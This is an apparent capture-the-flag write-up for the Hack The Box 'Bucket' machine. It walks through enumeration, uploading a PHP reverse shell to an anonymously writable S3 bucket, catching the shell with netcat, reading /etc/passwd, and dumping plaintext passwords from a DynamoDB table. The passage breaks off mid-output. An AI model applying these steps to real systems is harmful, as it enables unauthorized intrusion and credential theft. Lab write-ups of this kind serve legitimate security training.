80 - bucket.htb">TCP 80 - bucket.htb</a><ul><li><a href=#gobuster aria-label=Gobuster>Gobuster</a></li></ul></li><li><a href=#tcp-80---s3buckethtb aria-label="TCP 80 - s3.bucket.htb">TCP 80 - s3.bucket.htb</a><ul><li><a href=#gobuster-1 aria-label=Gobuster>Gobuster</a></li><li><a href=#shell aria-label=/shell>/shell</a></li><li><a href=#health aria-label=/health>/health</a></li></ul></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a><ul><li><a href=#aws-s3 aria-label="AWS S3">AWS S3</a></li><li><a href=#php-reverse-shell-upload-via-s3 aria-label="PHP Reverse Shell upload via S3">PHP Reverse Shell upload via S3</a></li></ul></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-roy aria-label="Shell as roy">Shell as roy</a><ul><li><a href=#enumeration-1 aria-label=Enumeration>Enumeration</a></li><li><a href=#aws-dynamodb aria-label="AWS DynamoDB">AWS DynamoDB</a></li><li><a href=#ssh-access aria-label="SSH Access">SSH Access</a></li></ul></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a><ul><li><a href=#enumeration-2 aria-label=Enumeration>Enumeration</a></li><li><a href=#internal-web aria-label="Internal Web">Internal Web</a></li><li><a href=#source-code-review aria-label="Source Code Review">Source Code Review</a></li><li><a href=#obtain-root-ssh-key aria-label="Obtain root SSH Key">Obtain root SSH Key</a></li></ul></li></ul></li><li><a href=#references aria-label=References>References</a></li></ul></div></details></div><div class=post-content><p>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.</p><h3 id=skills-learned>Skills Learned<a hidden class=anchor aria-hidden=true href=#skills-learned>#</a></h3><ul><li>Pentesting AWS S3</li><li>Port Forwarding</li><li>Exploiting PD4ML</li></ul><h3 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Gobuster - <a href=https://github.com/OJ/gobuster>https://github.com/OJ/gobuster</a></li><li>AWS CLI - <a href=https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install>https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li></ul><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style=color:#ae81ff>4</span> <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Scanning through all the ports return the same result.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---buckethtb>TCP 80 - bucket.htb<a hidden class=anchor aria-hidden=true href=#tcp-80---buckethtb>#</a></h3><p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://10.10.10.212

<span style=color:#75715e>&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style=color:#f92672>html</span>&gt;&lt;<span style=color:#f92672>head</span>&gt;
&lt;<span style=color:#f92672>title</span>&gt;302 Found&lt;/<span style=color:#f92672>title</span>&gt;
&lt;/<span style=color:#f92672>head</span>&gt;&lt;<span style=color:#f92672>body</span>&gt;
&lt;<span style=color:#f92672>h1</span>&gt;Found&lt;/<span style=color:#f92672>h1</span>&gt;
&lt;<span style=color:#f92672>p</span>&gt;The document has moved &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/<span style=color:#f92672>a</span>&gt;.&lt;/<span style=color:#f92672>p</span>&gt;
&lt;<span style=color:#f92672>hr</span>&gt;
&lt;<span style=color:#f92672>address</span>&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;/<span style=color:#f92672>address</span>&gt;
&lt;/<span style=color:#f92672>body</span>&gt;&lt;/<span style=color:#f92672>html</span>&gt;
</code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>10.10.10.212    bucket.htb
</code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p><p><img class=img-container src=imgs/image-20210422234425022.png alt=image-20210422234425022></p><p>Inspecting the page source discovers a vhost.</p><p><img class=img-container src=imgs/image-20210422234754897.png alt=image-20210422234754897></p><p>I&rsquo;ll add the vhost name to <code>/etc/hosts</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>10.10.10.212    bucket.htb s3.bucket.htb
</code></pre></div><h4 id=gobuster>Gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h4><p>There&rsquo;s no interesting results.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80

...&lt;SNIP&gt;...
/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 5344<span style=color:#f92672>]</span>
/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 275<span style=color:#f92672>]</span> 
</code></pre></div><h3 id=tcp-80---s3buckethtb>TCP 80 - s3.bucket.htb<a hidden class=anchor aria-hidden=true href=#tcp-80---s3buckethtb>#</a></h3><p>Visiting the newly discovered hostname displays a typical json output format.</p><p><img class=img-container src=imgs/image-20210422235335494.png alt=image-20210422235335494></p><h4 id=gobuster-1>Gobuster<a hidden class=anchor aria-hidden=true href=#gobuster-1>#</a></h4><p><code>gobuster</code> scan discovers a few web paths.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80

...&lt;SNIP&gt;...
/shell                <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>
/health               <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 54<span style=color:#f92672>]</span>
/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 275<span style=color:#f92672>]</span> 
</code></pre></div><h4 id=shell>/shell<a hidden class=anchor aria-hidden=true href=#shell>#</a></h4><p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p><p><img class=img-container src=imgs/image-20210424222707480.png alt=image-20210424222707480></p><p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «~» «10.10.14.51» 
$ curl -sv http://s3.bucket.htb/shell

...&lt;SNIP&gt;...
&lt; refresh: 0; url<span style=color:#f92672>=</span>http://444af250749d:4566/shell/
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
&lt; access-control-expose-headers: x-amz-version-id
&lt; 
* Connection <span style=color:#75715e>#0 to host s3.bucket.htb left intact</span>
</code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</code></pre></div><p>Searching some of the header names on Google reveals those are used by Amazon S3</p><p><img class=img-container src=imgs/image-20210425002915838.png alt=image-20210425002915838></p><p>Adding another <code>/</code> at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.</p><p><img class=img-container src=imgs/image-20210424223257481.png alt=image-20210424223257481></p><h4 id=health>/health<a hidden class=anchor aria-hidden=true href=#health>#</a></h4><p><code>/health</code> is probably an endpoint to monitor the service status.</p><p><img class=img-container src=imgs/image-20210422235825937.png alt=image-20210422235825937></p><h2 id=foothold>Foothold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a hidden class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=aws-s3>AWS S3<a hidden class=anchor aria-hidden=true href=#aws-s3>#</a></h4><p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href=https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install>aws cli</a>. You can find the user guide <a href=https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets>here</a>.</p><p>Usage in general:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>aws [options] s3 &lt;subcommand&gt; [parameters]
</code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p><blockquote><p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb 
You must specify a region. You can also configure your region by running <span style=color:#e6db74>&#34;aws configure&#34;</span>.
</code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws configure
AWS Access Key ID <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>:
AWS Secret Access Key <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>:
Default region name <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>: us-east-1
Default output format <span style=color:#f92672>[</span>None<span style=color:#f92672>]</span>:
</code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb 
2020-10-21 09:16:03 adserver
</code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb
                           PRE images/
2020-10-21 09:22:04       <span style=color:#ae81ff>5344</span> index.html

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/images/ --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb
2020-10-21 09:52:04      <span style=color:#ae81ff>37840</span> bug.jpg
2020-10-21 09:52:04      <span style=color:#ae81ff>51485</span> cloud.png
2020-10-21 09:52:04      <span style=color:#ae81ff>16486</span> malware.png
</code></pre></div><p>Those files are the same files seen in <code>bucket.htb</code>.</p><h4 id=php-reverse-shell-upload-via-s3>PHP Reverse Shell upload via S3<a hidden class=anchor aria-hidden=true href=#php-reverse-shell-upload-via-s3>#</a></h4><p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href=https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy>source</a>).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws s3 cp &lt;source&gt; &lt;target&gt; <span style=color:#f92672>[</span>--options<span style=color:#f92672>]</span>
</code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test files and upload it to the bucket.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ echo <span style=color:#e6db74>&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb
upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb 
                           PRE images/
2021-04-22 14:05:15         <span style=color:#ae81ff>21</span> iamf-test.php
2021-04-22 14:05:04       <span style=color:#ae81ff>5344</span> index.html
</code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of php code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
&lt;?php echo <span style=color:#e6db74>&#34;IamF&#34;</span> ?&gt;

→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf-test.php
IamF
</code></pre></div><p><img class=img-container src=imgs/image-20210423010636324.png alt=image-20210423010636324></p><p>Now I can try to drop a <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>PHP reverse shell</a>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb
</code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf.php
</code></pre></div><p>I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ rlwrap nc -nvlp <span style=color:#ae81ff>9001</span>
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9001</span> ...
connect to <span style=color:#f92672>[</span>10.10.14.39<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.10.212<span style=color:#f92672>]</span> <span style=color:#ae81ff>58352</span>
Linux bucket 5.4.0-48-generic <span style=color:#75715e>#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:14:02 up 13:18,  <span style=color:#ae81ff>0</span> users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
bash: cannot set terminal process group <span style=color:#f92672>(</span>1050<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
bash: no job control in this shell
www-data@bucket:/$ 
</code></pre></div><p><img class=img-container src=imgs/image-20210423011428675.png alt=image-20210423011428675></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-roy>Shell as roy<a hidden class=anchor aria-hidden=true href=#shell-as-roy>#</a></h3><h4 id=enumeration-1>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>There is a <code>bucket-app</code>, but I don&rsquo;t have access to it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/var/www$ ls -la
total <span style=color:#ae81ff>16</span>
drwxr-xr-x   <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 .
drwxr-xr-x  <span style=color:#ae81ff>14</span> root root <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 ..
drwxr-x---+  <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 bucket-app
drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 18:27 html
</code></pre></div><p><code>roy</code> is the only user in this box.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
</code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/var/www$ ls -la /home/roy
total <span style=color:#ae81ff>44</span>
drwxr-xr-x <span style=color:#ae81ff>7</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 12:03 .
drwxr-xr-x <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> ..
drwxrwxr-x <span style=color:#ae81ff>2</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 12:03 .aws
lrwxrwxrwx <span style=color:#ae81ff>1</span> roy  roy     <span style=color:#ae81ff>9</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style=color:#ae81ff>1</span> roy  roy   <span style=color:#ae81ff>220</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> roy  roy  <span style=color:#ae81ff>3771</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> .bashrc
drwx------ <span style=color:#ae81ff>2</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 07:57 .cache
drwx------ <span style=color:#ae81ff>4</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 08:01 .gnupg
-rw-r--r-- <span style=color:#ae81ff>1</span> roy  roy   <span style=color:#ae81ff>807</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> .profile
drwxr-xr-x <span style=color:#ae81ff>3</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 07:59 project
drwxr-xr-x <span style=color:#ae81ff>3</span> roy  roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 07:59 snap
-r-------- <span style=color:#ae81ff>1</span> roy  roy    <span style=color:#ae81ff>33</span> Apr <span style=color:#ae81ff>22</span> 04:56 user.txt
</code></pre></div><p>The files inside <code>project</code> are readable by others.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/home/roy/project$ ls -la
total <span style=color:#ae81ff>44</span>
drwxr-xr-x  <span style=color:#ae81ff>3</span> roy roy  <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2020</span> .
drwxr-xr-x  <span style=color:#ae81ff>5</span> roy roy  <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>24</span> 17:31 ..
-rw-rw-r--  <span style=color:#ae81ff>1</span> roy roy    <span style=color:#ae81ff>63</span> Sep <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2020</span> composer.json
-rw-rw-r--  <span style=color:#ae81ff>1</span> roy roy <span style=color:#ae81ff>20533</span> Sep <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2020</span> composer.lock
-rw-r--r--  <span style=color:#ae81ff>1</span> roy roy   <span style=color:#ae81ff>367</span> Sep <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2020</span> db.php
drwxrwxr-x <span style=color:#ae81ff>10</span> roy roy  <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2020</span> vendor
</code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/home/roy/project$ cat db.php

&lt;?php
require <span style=color:#e6db74>&#39;vendor/autoload.php&#39;</span>;
date_default_timezone_set<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;America/New_York&#39;</span><span style=color:#f92672>)</span>;
use Aws<span style=color:#ae81ff>\D</span>ynamoDb<span style=color:#ae81ff>\D</span>ynamoDbClient;
use Aws<span style=color:#ae81ff>\D</span>ynamoDb<span style=color:#ae81ff>\E</span>xception<span style=color:#ae81ff>\D</span>ynamoDbException;

$client <span style=color:#f92672>=</span> new Aws<span style=color:#ae81ff>\S</span>dk<span style=color:#f92672>([</span>
    <span style=color:#e6db74>&#39;profile&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;default&#39;</span>,
    <span style=color:#e6db74>&#39;region&#39;</span>  <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;us-east-1&#39;</span>,
    <span style=color:#e6db74>&#39;version&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;latest&#39;</span>,
    <span style=color:#e6db74>&#39;endpoint&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;http://localhost:4566&#39;</span>
<span style=color:#f92672>])</span>;

$dynamodb <span style=color:#f92672>=</span> $client-&gt;createDynamoDb<span style=color:#f92672>()</span>;

//todo
</code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@bucket:/home/roy/project$ curl -s http://localhost:4566

<span style=color:#f92672>{</span>
	<span style=color:#e6db74>&#34;s3&#34;</span>: <span style=color:#e6db74>&#34;running&#34;</span>, 
	<span style=color:#e6db74>&#34;dynamodb&#34;</span>: <span style=color:#e6db74>&#34;running&#34;</span>
<span style=color:#f92672>}</span>
</code></pre></div><h4 id=aws-dynamodb>AWS DynamoDB<a hidden class=anchor aria-hidden=true href=#aws-dynamodb>#</a></h4><p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p><p>General usage:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>usage: aws <span style=color:#f92672>[</span>options<span style=color:#f92672>]</span> dynamodb &lt;subcommand&gt; <span style=color:#f92672>[</span>&lt;subcommand&gt; ...<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>parameters<span style=color:#f92672>]</span>
</code></pre></div><p>Anonymous user is allowed to list the database tables.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;TableNames&#34;</span>: <span style=color:#f92672>[</span>
        <span style=color:#e6db74>&#34;users&#34;</span>
    <span style=color:#f92672>]</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;Items&#34;</span>: <span style=color:#f92672>[</span>
        <span style=color:#f92672>{</span>
            <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Management@#1@#&#34;</span>
            <span style=color:#f92672>}</span>,
            <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Mgmt&#34;</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>}</span>,
        <span style=color:#f92672>{</span>
            <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Welcome123!&#34;</span>
            <span style=color:#f92672>}</span>,
            <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Cloudadm&#34;</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>}</span>,
        <span style=color:#f92672>{</span>
            <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
            <span style=color:#f92672>}</span>,
            <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Sysadm&#34;</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>}</span>
    <span style=color:#f92672>]</span>,
    <span style=color:#e6db74>&#34;Count&#34;</span>: 3,
